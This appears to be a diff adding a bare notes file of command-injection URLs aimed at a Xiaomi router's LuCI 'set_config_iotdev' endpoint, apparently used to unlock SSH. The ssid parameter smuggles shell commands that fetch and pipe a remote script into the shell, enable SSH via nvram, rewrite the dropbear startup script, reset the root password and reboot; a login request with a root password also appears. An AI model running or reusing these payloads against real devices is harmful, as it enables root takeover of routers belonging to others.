@@ -1,0 +1,48 @@
+http://192.168.31.1/cgi-bin/luci/;stok=STOKVALUEHERE/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Acurl%20--insecure%20https%3A%2F%2Fraw.githubusercontent.com%2FKaMyKaSii%2FUnlock-SSH-on-Xiaomi-and-Redmi-WiFi-6-routers%2Fmaster%2Funlock_ssh.sh%20%7C%20ash%0A
+
+http://192.168.31.1/cgi-bin/luci/;stok=6381ef4e52be8d1e548d2aaf32a409de/web/home#router
+
+http://192.168.31.1/cgi-bin/luci/;stok=6381ef4e52be8d1e548d2aaf32a409de/web/home#router
+
+http://192.168.31.1/cgi-bin/luci/;stok=6381ef4e52be8d1e548d2aaf32a409de/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Acurl%20--insecure%20https%3A%2F%2Fraw.githubusercontent.com%2FKaMyKaSii%2FUnlock-SSH-on-Xiaomi-and-Redmi-WiFi-6-routers%2Fmaster%2Funlock_ssh.sh%20%7C%20ash%0A
+
+http://192.168.31.1/cgi-bin/luci/;stok=6381ef4e52be8d1e548d2aaf32a409de/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h%3Bnvram%20set%20ssh%5Fen%3D1%3B%20nvram%20commit%3B
+
+http://192.168.31.1/cgi-bin/luci/;stok=6381ef4e52be8d1e548d2aaf32a409de/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=-h; cp /etc/init.d/dropbear /etc/init.d/dropbear_startup_backup; sed -i '/\"\$flg_ssh\"\ \!\=\ \"1\"\ \-o\ \"\$channel\"\ \=\ \"release\"/, 2d' /etc/init.d/dropbear; /etc/init.d/dropbear enable; /etc/init.d/dropbear start;
+
+http://192.168.31.1/cgi-bin/luci/;stok=6381ef4e52be8d1e548d2aaf32a409de/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=%0Areboot%0A
+
+
+curl -X POST http://192.168.1.1/cgi-bin/luci/rpc/auth --data '
+{
+  "id": 1,
+  "method": "login",
+  "params": ["root", "s0ccerf00l##"]
+}'
+
+
+nvram set ssh_en=1
+http://192.168.31.1/cgi-bin/luci/;stok=7f6c4958dd71bf821e37fb11dcc8ec4a/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Anvram%20set%20ssh%5Fen%3D1%0A
+
+nvram commit
+http://192.168.31.1/cgi-bin/luci/;stok=7f6c4958dd71bf821e37fb11dcc8ec4a/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Anvram%20commit%0A
+
+cp /etc/init.d/dropbear /etc/init.d/dropbear_backup
+http://192.168.31.1/cgi-bin/luci/;stok=7f6c4958dd71bf821e37fb11dcc8ec4a/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Acp%20%2Fetc%2Finit.d%2Fdropbear%20%2Fetc%2Finit.d%2Fdropbear_backup%0A
+
+sed -i '/flg_ssh.*release/ { :a; N; /fi/! ba };/return 0/d' /etc/init.d/dropbear
+http://192.168.31.1/cgi-bin/luci/;stok=7f6c4958dd71bf821e37fb11dcc8ec4a/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Ased%20-i%20'%2Fflg_ssh.*release%2F%20%7B%20%3Aa%3B%20N%3B%20%2Ffi%2F!%20ba%20%7D%3B%2Freturn%200%2Fd'%20%2Fetc%2Finit.d%2Fdropbear%0A
+
+echo -e "<PASSWORD>/n<PASSWORD>" | passwd root
+http://192.168.31.1/cgi-bin/luci/;stok=7f6c4958dd71bf821e37fb11dcc8ec4a/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0Aecho%20-e%20%27<PASSWORD>%5Cn<PASSWORD>%27%20%7C%20passwd%20root%0A
+
+/etc/init.d/dropbear enable
+http://192.168.31.1/cgi-bin/luci/;stok=7f6c4958dd71bf821e37fb11dcc8ec4a/api/misystem/set_config_iotdev?bssid=gallifrey&user_id=doctor&ssid=-h%0A%2Fetc%2Finit.d%2Fdropbear%20enable%0A
+
+/etc/init.d/dropbear start
+http://192.168.31.1/cgi-bin/luci/;stok=7f6c4958dd71bf821e37fb11dcc8ec4a/api/misystem/set_config_iotdev?bssid=doctor&user_id=doctor&ssid=-h%0A%2Fetc%2Finit.d%2Fdropbear%20start%0A
+
+
+http://192.168.31.1/cgi-bin/luci/;stok=c133d7edbe0e632d63b4dfd637701aaf/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=%0Areboot%0A
+
+http://192.168.31.1/cgi-bin/luci/;stok=c133d7edbe0e632d63b4dfd637701aaf/api/misystem/set_config_iotdev?bssid=Xiaomi&user_id=longdike&ssid=%3BAreboot%3B
